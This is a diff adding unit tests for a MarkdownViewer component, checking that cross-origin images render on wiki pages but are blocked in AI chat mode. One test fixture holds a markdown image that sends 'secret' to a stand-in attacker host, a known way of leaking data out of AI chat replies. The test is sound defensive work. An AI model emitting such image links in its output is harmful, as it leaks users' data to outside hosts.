@@ -99,3 +99,25 @@ describe('MarkdownViewer publicMode', () => {
     expect(api.get).not.toHaveBeenCalled()
   })
 })
+
+describe('MarkdownViewer allowExternalImages', () => {
+  const content = '![leak](https://evil.example/x.png?d=secret) ![ok](/api/media/file/a.png)'
+
+  it('keeps external images by default (regular wiki pages)', async () => {
+    const { container } = renderViewer({ content })
+    await waitFor(() => {
+      expect(container.querySelectorAll('img')).toHaveLength(2)
+    })
+  })
+
+  it('replaces cross-origin images with text when disabled (AI chat)', async () => {
+    const { container } = renderViewer({ content, allowExternalImages: false })
+    await waitFor(() => {
+      const imgs = container.querySelectorAll('img')
+      expect(imgs).toHaveLength(1)
+      expect(imgs[0].getAttribute('src')).toBe('/api/media/file/a.png')
+    })
+    expect(container.innerHTML).not.toContain('evil.example')
+    expect(container.querySelector('.external-image-blocked').textContent).toContain('leak')
+  })
+})
